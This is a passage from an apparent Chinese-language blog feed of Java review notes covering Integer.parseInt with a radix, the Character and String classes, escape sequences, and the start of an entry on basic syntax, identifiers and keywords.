使用第二个参数指定的基数，将字符串参数解析为有符号的整数。简单说就是，把字符串转换成十进制数。如果只有一个参数（即字符串），那么结果就是这个字符串；如果有两个参数（一个字符串s，一个整数x），那么把字符串的数字当成x进制的数，然后转化为十进制输出。</p><p>用法：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*1.*/</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">parseInt</span><span class="hljs-params">(String s)</span><span class="hljs-comment">/*默认十进制*/</span></span><br><span class="hljs-function"><span class="hljs-comment">/*2.*/</span></span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">parseInt</span><span class="hljs-params">(String s, <span class="hljs-keyword">int</span> radix)</span><span class="hljs-comment">/*把字符串当成radix进制数，然后转换成十进制数*/</span></span><br></code></pre></div></td></tr></table></figure><p>s – 十进制表示的字符串。radix – 指定的基数（即把字符串s当成几进制数）。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span></span>&#123;<br><span class="hljs-keyword">int</span> x =Integer.parseInt(<span class="hljs-string">&quot;9&quot;</span>);<span class="hljs-comment">/*默认十进制*/</span><br><span class="hljs-keyword">double</span> c = Double.parseDouble(<span class="hljs-string">&quot;5&quot;</span>);<span class="hljs-comment">/*默认十进制*/</span><br><span class="hljs-keyword">int</span> b = Integer.parseInt(<span class="hljs-string">&quot;444&quot;</span>,<span class="hljs-number">16</span>);<span class="hljs-comment">/*把字符串“444”的数字当成是16进制*/</span><br><br>System.out.println(x);<br>System.out.println(c);<br>System.out.println(b);<br>&#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br><span class="hljs-number">9</span> <span class="hljs-comment">/*十进制数*/</span><br><span class="hljs-number">5.0</span> <span class="hljs-comment">/*十进制数*/</span><br><span class="hljs-number">1092</span> <span class="hljs-comment">/*十进制数*/</span><br></code></pre></div></td></tr></table></figure><h2 id="4-Java-Character类"><a href="#4-Java-Character类" class="headerlink" title="4.Java Character类"></a>4.Java Character类</h2><p>使用字符时，我们通常使用的是内置数据类型 char。然而，在实际开发过程中，我们经常会遇到需要使用对象，而不是内置数据类型的情况。<br>Java 语言为内置数据类型 char 提供了包装类 Character 类。Character类的用法：Character 类提供了一系列方法来操纵字符，可以使用 Character 的构造方法创建一个 Character 类对象。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Character ch = <span class="hljs-keyword">new</span> Character(<span class="hljs-string">&#x27;a&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>在某些情况下，Java 编译器会自动创建一个 Character 对象。例如，将一个 char 类型的参数传递给需要一个 Character 类型参数时，那么编译器会自动地将 char 类型参数转换为 Character 对象。 这种特征称为装箱，反过来称为拆箱。 </p><h3 id="4-1-转义序列"><a href="#4-1-转义序列" class="headerlink" title="4.1 转义序列"></a>4.1 转义序列</h3><p>前面有反斜杠（\）的字符代表转义字符，它对编译器来说是有特殊含义的。<br>Java 的转义序列。</p><table><thead><tr><th align="center">转义序列</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">\t</td><td align="center">在文中该处插入一个tab键</td></tr><tr><td align="center">\b</td><td align="center">在文中该处插入一个后退键</td></tr><tr><td align="center">\n</td><td align="center">在文中该处换行</td></tr><tr><td align="center">\r</td><td align="center">在文中该处插入回车</td></tr><tr><td align="center">\f</td><td align="center">在文中该处插入换页符</td></tr><tr><td align="center">\‘</td><td align="center">在文中该处插入单引号</td></tr><tr><td align="center">\“</td><td align="center">在文中该处插入双引号</td></tr><tr><td align="center">\\</td><td align="center">在文中该处插入反斜杠</td></tr></tbody></table><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;She said \&quot;Hello!\&quot; to me.&quot;</span>);<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>She said <span class="hljs-string">&quot;Hello!&quot;</span> to me.<br></code></pre></div></td></tr></table></figure><h3 id="4-2-Character-方法"><a href="#4-2-Character-方法" class="headerlink" title="4.2 Character 方法"></a>4.2 Character 方法</h3><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">isLetter()</td><td align="center">是否是一个字母</td></tr><tr><td align="center">isDigit()</td><td align="center">是否是一个数字字符</td></tr><tr><td align="center">isWhitespace()</td><td align="center">是否一个空格</td></tr><tr><td align="center">isUpperCase()</td><td align="center">是否是大写字母</td></tr><tr><td align="center">isLowerCase()</td><td align="center">是否是小写字母</td></tr><tr><td align="center">toUpperCase()</td><td align="center">指定字母的大写形式</td></tr><tr><td align="center">toLowerCase()</td><td align="center">指定字母的小写形式</td></tr><tr><td align="center">toString()</td><td align="center">返回字符的字符串形式，字符串的长度仅为1</td></tr></tbody></table><h3 id="4-3-初学常用方法"><a href="#4-3-初学常用方法" class="headerlink" title="4.3 初学常用方法"></a>4.3 初学常用方法</h3><blockquote><ol><li>public static boolean isUpperCase(char ch): 判断给定的字符是否是大写字符；</li></ol></blockquote><blockquote><ol start="2"><li>public static boolean isLowerCase(char ch): 判断给定的字符是否是小写字符；</li></ol></blockquote><blockquote><ol start="3"><li>public static boolean isDigit(char ch): 判断给定的字符是否是数字字符；</li></ol></blockquote><p>这三个方法的返回值是 boolean 型。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Java</span> </span>&#123;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>Character ch = <span class="hljs-keyword">new</span> Character(<span class="hljs-string">&#x27;X&#x27;</span>);<br><br>System.out.println(Character.isUpperCase(ch));<br><span class="hljs-comment">//Character.isUpperCase(ch) 用于判断括号里的字母是否为大写</span><br>System.out.println(Character.isLowerCase(ch));<br><span class="hljs-comment">//Character.isLowerCase(ch) 用于判断括号里的字母是否为小写</span><br>System.out.println(Character.isDigit(ch));<br><span class="hljs-comment">//Character.isDigit(ch) 用于判断括号里的内容是否为数字</span><br>&#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">false</span><br></code></pre></div></td></tr></table></figure><h2 id="5-Java-String类"><a href="#5-Java-String类" class="headerlink" title="5.Java String类"></a>5.Java String类</h2><p>字符串广泛应用在Java编程中，在Java中字符串属于对象，Java提供了String类来创建和操作字符串。</p><h3 id="5-1-创建字符串"><a href="#5-1-创建字符串" class="headerlink" title="5.1 创建字符串"></a>5.1 创建字符串</h3><p>在代码中遇到字符串常量时，编译器会使用该值创建一个 String 对象。和其它对象一样，可以使用关键字和构造方法来创建String对象。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String greeting = <span class="hljs-string">&quot;Hello world!&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>String 类有 11 种构造方法，这些方法提供不同的参数来初始化字符串。</p><p>使用实例：以一个字符数组为参数</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringDemo</span></span>&#123;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span></span>&#123;<br>      <span class="hljs-keyword">char</span>[] helloArray = &#123; <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>&#125;;<br>      String helloString = <span class="hljs-keyword">new</span> String(helloArray);  <br>      System.out.println( helloString );<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>hello.<br></code></pre></div></td></tr></table></figure><p>String 类是不可改变的，所以你一旦创建了 String 对象，那它的值就无法改变了。 如果需要对字符串做很多修改，那么应该选择使用 StringBuffer &amp; StringBuilder 类。</p><h3 id="5-2-字符串长度"><a href="#5-2-字符串长度" class="headerlink" title="5.2 字符串长度"></a>5.2 字符串长度</h3><p>用于获取有关对象的信息的方法称为访问器方法。String 类的一个访问器方法是 length() 方法，它返回字符串对象包含的字符数。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringDemo</span> </span>&#123;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>      String palindrome = <span class="hljs-string">&quot;Dot saw I was Tod&quot;</span>;<br>      <span class="hljs-keyword">int</span> len = palindrome.length();<br>      System.out.println( <span class="hljs-string">&quot;String Length is : &quot;</span> + len );<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>String Length is : <span class="hljs-number">17</span><br></code></pre></div></td></tr></table></figure><h3 id="5-3-连接字符串"><a href="#5-3-连接字符串" class="headerlink" title="5.3 连接字符串"></a>5.3 连接字符串</h3><p>String 类提供了连接两个字符串的方法。</p><h4 id="5-3-1-concat-方法"><a href="#5-3-1-concat-方法" class="headerlink" title="5.3.1 concat() 方法"></a>5.3.1 concat() 方法</h4><p>实例：返回 string2 连接 string1 的新字符串。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">string1.concat(string2);<br></code></pre></div></td></tr></table></figure><p>也可以对字符串常量使用 concat() 方法。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-string">&quot;My name is &quot;</span>.concat(<span class="hljs-string">&quot;Zara&quot;</span>);<br></code></pre></div></td></tr></table></figure><h4 id="5-3-2-加号-连接"><a href="#5-3-2-加号-连接" class="headerlink" title="5.3.2 加号(+)连接"></a>5.3.2 加号(+)连接</h4><p>更加常用的一种方法。<br>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-string">&quot;Hello,&quot;</span> + <span class="hljs-string">&quot; world&quot;</span> + <span class="hljs-string">&quot;!&quot;</span><br><span class="hljs-comment">/*连接结果*/</span><br><span class="hljs-string">&quot;Hello, world!&quot;</span><br></code></pre></div></td></tr></table></figure><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringDemo</span> </span>&#123;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;     <br>   String string1 = <span class="hljs-string">&quot;saw I was &quot;</span>;     <br>   System.out.println(<span class="hljs-string">&quot;Dot &quot;</span> + string1 + <span class="hljs-string">&quot;Tod&quot;</span>);  <br>&#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>Dot saw I was Tod<br></code></pre></div></td></tr></table></figure><h3 id="5-4-创建格式化字符串"><a href="#5-4-创建格式化字符串" class="headerlink" title="5.4 创建格式化字符串"></a>5.4 创建格式化字符串</h3><p>输出格式化数字可以使用 printf() 和 format() 方法。<br>String 类使用静态方法 format() 返回一个 String 对象而不是 PrintStream 对象。String 类的静态方法 format() 能用来创建可复用的格式化字符串，而不仅仅是用于一次打印输出。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">System.out.printf(<span class="hljs-string">&quot;The value of the float variable is &quot;</span> +<br>                  <span class="hljs-string">&quot;%f, while the value of the integer &quot;</span> +<br>                  <span class="hljs-string">&quot;variable is %d, and the string &quot;</span> +<br>                  <span class="hljs-string">&quot;is %s&quot;</span>, floatVar, intVar, stringVar);<br></code></pre></div></td></tr></table></figure><p>或者：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String fs;<br>fs = String.format(<span class="hljs-string">&quot;The value of the float variable is &quot;</span> +<br>                   <span class="hljs-string">&quot;%f, while the value of the integer &quot;</span> +<br>                   <span class="hljs-string">&quot;variable is %d, and the string &quot;</span> +<br>                   <span class="hljs-string">&quot;is %s&quot;</span>, floatVar, intVar, stringVar);<br>System.out.println(fs);<br></code></pre></div></td></tr></table></figure><h3 id="5-5-String-方法"><a href="#5-5-String-方法" class="headerlink" title="5.5 String 方法"></a>5.5 String 方法</h3><table><thead><tr><th align="center">方法</th><th align="center">方法描述</th></tr></thead><tbody><tr><td align="center">char charAt(int index)</td><td align="center">返回指定索引处的 char 值。</td></tr><tr><td align="center">int compareTo(Object o)</td><td align="center">把这个字符串和另一个对象比较。</td></tr><tr><td align="center">int compareTo(String anotherString)</td><td align="center">按字典顺序比较两个字符串。</td></tr><tr><td align="center">int compareToIgnoreCase(String str)</td><td align="center">按字典顺序比较两个字符串，不考虑大小写。</td></tr><tr><td align="center">String concat(String str)</td><td align="center">将指定字符串连接到此字符串的结尾。</td></tr><tr><td align="center">boolean contentEquals(StringBuffer sb)</td><td align="center">当且仅当字符串与指定的StringButter有相同顺序的字符时候返回真。</td></tr><tr><td align="center">static String copyValueOf(char[] data)</td><td align="center">返回指定数组中表示该字符序列的 String。</td></tr><tr><td align="center">static String copyValueOf(char[] data, int offset, int count)</td><td align="center">返回指定数组中表示该字符序列的 String。</td></tr><tr><td align="center">boolean endsWith(String suffix)</td><td align="center">测试此字符串是否以指定的后缀结束。</td></tr><tr><td align="center">boolean equals(Object anObject)</td><td align="center">将此字符串与指定的对象比较。</td></tr><tr><td align="center">boolean equalsIgnoreCase(String anotherString)</td><td align="center">将此 String 与另一个 String 比较，不考虑大小写。</td></tr><tr><td align="center">byte[] getBytes()</td><td align="center">使用平台的默认字符集将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中。</td></tr><tr><td align="center">[byte] getBytes(String charsetName)</td><td align="center">使用指定的字符集将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中。</td></tr><tr><td align="center">void getChars(int srcBegin, int srcEnd, char[] dst, int dstBegin)</td><td align="center">将字符从此字符串复制到目标字符数组。</td></tr><tr><td align="center">int hashCode()</td><td align="center">返回此字符串的哈希码。</td></tr><tr><td align="center">int indexOf(int ch)</td><td align="center">返回指定字符在此字符串中第一次出现处的索引。</td></tr><tr><td align="center">int indexOf(int ch, int fromIndex)</td><td align="center">返回在此字符串中第一次出现指定字符处的索引，从指定的索引开始搜索。</td></tr><tr><td align="center">int indexOf(String str)</td><td align="center">返回指定子字符串在此字符串中第一次出现处的索引。</td></tr><tr><td align="center">int indexOf(String str, int fromIndex)</td><td align="center">返回指定子字符串在此字符串中第一次出现处的索引，从指定的索引开始。</td></tr><tr><td align="center">String intern()</td><td align="center">返回字符串对象的规范化表示形式。</td></tr><tr><td align="center">int lastIndexOf(int ch)</td><td align="center">返回指定字符在此字符串中最后一次出现处的索引。</td></tr><tr><td align="center">int lastIndexOf(int ch, int fromIndex)</td><td align="center">返回指定字符在此字符串中最后一次出现处的索引，从指定的索引处开始进行反向搜索。</td></tr><tr><td align="center">int lastIndexOf(String str)</td><td align="center">返回指定子字符串在此字符串中最右边出现处的索引。</td></tr><tr><td align="center">int lastIndexOf(String str, int fromIndex)</td><td align="center">返回指定子字符串在此字符串中最后一次出现处的索引，从指定的索引开始反向搜索。</td></tr><tr><td align="center">int length()</td><td align="center">返回此字符串的长度。</td></tr><tr><td align="center">boolean matches(String regex)</td><td align="center">告知此字符串是否匹配给定的正则表达式。</td></tr><tr><td align="center">boolean regionMatches(boolean ignoreCase, int toffset, String other, int ooffset, int len)</td><td align="center">测试两个字符串区域是否相等。</td></tr><tr><td align="center">boolean regionMatches(int toffset, String other, int ooffset, int len)</td><td align="center">测试两个字符串区域是否相等。</td></tr><tr><td align="center">String replace(char oldChar, char newChar)</td><td align="center">返回一个新的字符串，它是通过用 newChar 替换此字符串中出现的所有 oldChar 得到的。</td></tr><tr><td align="center">String replaceAll(String regex, String replacement)</td><td align="center">使用给定的 replacement 替换此字符串所有匹配给定的正则表达式的子字符串。</td></tr><tr><td align="center">String replaceFirst(String regex, String replacement)</td><td align="center">使用给定的 replacement 替换此字符串匹配给定的正则表达式的第一个子字符串。</td></tr><tr><td align="center">[String] split(String regex)</td><td align="center">根据给定正则表达式的匹配拆分此字符串。</td></tr><tr><td align="center">[String] split(String regex, int limit)</td><td align="center">根据匹配给定的正则表达式来拆分此字符串。</td></tr><tr><td align="center">boolean startsWith(String prefix)</td><td align="center">测试此字符串是否以指定的前缀开始。</td></tr><tr><td align="center">boolean startsWith(String prefix, int toffset)</td><td align="center">测试此字符串从指定索引开始的子字符串是否以指定前缀开始。</td></tr><tr><td align="center">CharSequence subSequence(int beginIndex, int endIndex)</td><td align="center">返回一个新的字符序列，它是此序列的一个子序列。</td></tr><tr><td align="center">String substring(int beginIndex)</td><td align="center">返回一个新的字符串，它是此字符串的一个子字符串。</td></tr><tr><td align="center">String substring(int beginIndex, int endIndex)</td><td align="center">返回一个新字符串，它是此字符串的一个子字符串。</td></tr><tr><td align="center">[char] toCharArray()</td><td align="center">将此字符串转换为一个新的字符数组。</td></tr><tr><td align="center">String toLowerCase()</td><td align="center">使用默认语言环境的规则将此 String 中的所有字符都转换为小写。</td></tr><tr><td align="center">String toLowerCase(Locale locale)</td><td align="center">使用给定 Locale 的规则将此 String 中的所有字符都转换为小写。</td></tr><tr><td align="center">String toString()</td><td align="center">返回此对象本身（它已经是一个字符串！）。</td></tr><tr><td align="center">String toUpperCase()</td><td align="center">使用默认语言环境的规则将此 String 中的所有字符都转换为大写。</td></tr><tr><td align="center">String toUpperCase(Locale locale)</td><td align="center">使用给定 Locale 的规则将此 String 中的所有字符都转换为大写。</td></tr><tr><td align="center">String trim()</td><td align="center">返回字符串的副本，忽略前导空白和尾部空白。</td></tr><tr><td align="center">static String valueOf(primitive data type x)</td><td align="center">返回给定data type类型x参数的字符串表示形式。</td></tr></tbody></table><hr>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习（九）</title>
    <link href="/2021/05/19/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B9%9D%EF%BC%89/"/>
    <url>/2021/05/19/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B9%9D%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习（九）。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Java-基础语法"><a href="#1-Java-基础语法" class="headerlink" title="1.Java 基础语法"></a>1.Java 基础语法</h2><ul><li>大小写敏感：Java是大小写敏感的，这就意味着标识符Hello与hello是不同的。</li><li>类名：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 MyFirstJavaClass 。</li><li>方法名：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li><li>源文件名：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记Java是大小写敏感的），文件名的后缀为.java。（如果文件名和类名不相同则会导致编译错误）。</li><li>主方法入口：所有的Java 程序由public static void main(String[] args)方法开始执行。</li></ul><h3 id="1-1-Java-标识符"><a href="#1-1-Java-标识符" class="headerlink" title="1.1 Java 标识符"></a>1.1 Java 标识符</h3><p>Java所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符。<br>Java标识符注意：</p><blockquote><p>所有的标识符都应该以字母（A-Z或者a-z）,美元符（$）、或者下划线（_）开始<br>首字符之后可以是任何字符的组合<br>关键字不能用作标识符<br>标识符是大小写敏感的<br>合法标识符举例：age、$salary、_value、__1_value<br>非法标识符举例：123abc、-salary</p></blockquote><h3 id="1-2-Java-关键字"><a href="#1-2-Java-关键字" class="headerlink" title="1.2 Java 关键字"></a>1.2 Java 关键字</h3><table><thead><tr><th align="center">关键字</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">abstract</td><td align="center">抽象方法，抽象类的修饰符</td></tr><tr><td align="center">assert</td><td align="center">断言条件是否满足</td></tr><tr><td align="center">boolean</td><td align="center">布尔数据类型</td></tr><tr><td align="center">break</td><td align="center">跳出循环或者label代码段</td></tr><tr><td align="center">byte</td><td align="center">8-bit 有符号数据类型</td></tr><tr><td align="center">case</td><td align="center">switch语句的一个条件</td></tr><tr><td align="center">catch</td><td align="center">和try搭配捕捉异常信息</td></tr><tr><td align="center">char</td><td align="center">16-bit Unicode字符数据类型</td></tr><tr><td align="center">class</td><td align="center">定义类</td></tr><tr><td align="center">const</td><td align="center">未使用</td></tr><tr><td align="center">continue</td><td align="center">不执行循环体剩余部分</td></tr><tr><td align="center">default</td><td align="center">switch语句中的默认分支</td></tr><tr><td align="center">do</td><td align="center">循环语句，循环体至少会执行一次</td></tr><tr><td align="center">double</td><td align="center">64-bit双精度浮点数</td></tr><tr><td align="center">else</td><td align="center">if条件不成立时执行的分支</td></tr><tr><td align="center">enum</td><td align="center">枚举类型</td></tr><tr><td align="center">extends</td><td align="center">表示一个类是另一个类的子类</td></tr><tr><td align="center">final</td><td align="center">表示一个值在初始化之后就不能再改变了 表示方法不能被重写，或者一个类不能有子类</td></tr><tr><td align="center">finally</td><td align="center">为了完成执行的代码而设计的，主要是为了程序的健壮性和完整性，无论有没有异常发生都执行代码。</td></tr><tr><td align="center">float</td><td align="center">32-bit单精度浮点数</td></tr><tr><td align="center">for</td><td align="center">for循环语句</td></tr><tr><td align="center">goto</td><td align="center">未使用</td></tr><tr><td align="center">if</td><td align="center">条件语句</td></tr><tr><td align="center">implements</td><td align="center">表示一个类实现了接口</td></tr><tr><td align="center">import</td><td align="center">导入类</td></tr><tr><td align="center">instanceof</td><td align="center">测试一个对象是否是某个类的实例</td></tr><tr><td align="center">int</td><td align="center">32位整型数</td></tr><tr><td align="center">interface</td><td align="center">接口，一种抽象的类型，仅有方法和常量的定义</td></tr><tr><td align="center">long</td><td align="center">64位整型数</td></tr><tr><td align="center">native</td><td align="center">表示方法用非java代码实现</td></tr><tr><td align="center">new</td><td align="center">分配新的类实例</td></tr><tr><td align="center">package</td><td align="center">一系列相关类组成一个包</td></tr><tr><td align="center">private</td><td align="center">表示私有字段，或者方法等，只能从类内部访问</td></tr><tr><td align="center">protected</td><td align="center">表示字段只能通过类或者其子类访问 子类或者在同一个包内的其他类</td></tr><tr><td align="center">public</td><td align="center">表示共有属性或者方法</td></tr><tr><td align="center">return</td><td align="center">方法返回值</td></tr><tr><td align="center">short</td><td align="center">16位数字</td></tr><tr><td align="center">static</td><td align="center">表示在类级别定义，所有实例共享的</td></tr><tr><td align="center">strictfp</td><td align="center">浮点数比较使用严格的规则</td></tr><tr><td align="center">super</td><td align="center">表示基类</td></tr><tr><td align="center">switch</td><td align="center">选择语句</td></tr><tr><td align="center">synchronized</td><td align="center">表示同一时间只能由一个线程访问的代码块</td></tr><tr><td align="center">this</td><td align="center">表示调用当前实例 或者调用另一个构造函数</td></tr><tr><td align="center">throw</td><td align="center">抛出异常</td></tr><tr><td align="center">throws</td><td align="center">定义方法可能抛出的异常</td></tr><tr><td align="center">transient</td><td align="center">修饰不要序列化的字段</td></tr><tr><td align="center">try</td><td align="center">表示代码块要做异常处理或者和finally配合表示是否抛出异常都执行finally中的代码</td></tr><tr><td align="center">void</td><td align="center">标记方法不返回任何值</td></tr><tr><td align="center">volatile</td><td align="center">标记字段可能会被多个线程同时访问，而不做同步</td></tr><tr><td align="center">while</td><td align="center">while循环</td></tr></tbody></table><h3 id="1-3-Java-注释"><a href="#1-3-Java-注释" class="headerlink" title="1.3 Java 注释"></a>1.3 Java 注释</h3><p>Java支持单行以及多行注释。注释中的字符将被Java编译器忽略。</p><blockquote><p><strong>单行注释</strong></p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 这是单行注释的示例</span><br><span class="hljs-comment">/* 这个也是单行注释的示例 */</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>多行注释</strong></p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/* 这是第一个Java程序</span><br><span class="hljs-comment"> *它将打印Hello World</span><br><span class="hljs-comment"> * 这是一个多行注释的示例</span><br><span class="hljs-comment"> */</span><br></code></pre></div></td></tr></table></figure><h2 id="2-Java-对象和类"><a href="#2-Java-对象和类" class="headerlink" title="2.Java 对象和类"></a>2.Java 对象和类</h2><blockquote><ul><li>对象：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</li></ul></blockquote><blockquote><ul><li>类：类是一个模板，它描述一类对象的行为和状态。</li></ul></blockquote><h3 id="2-1-Java-类"><a href="#2-1-Java-类" class="headerlink" title="2.1 Java 类"></a>2.1 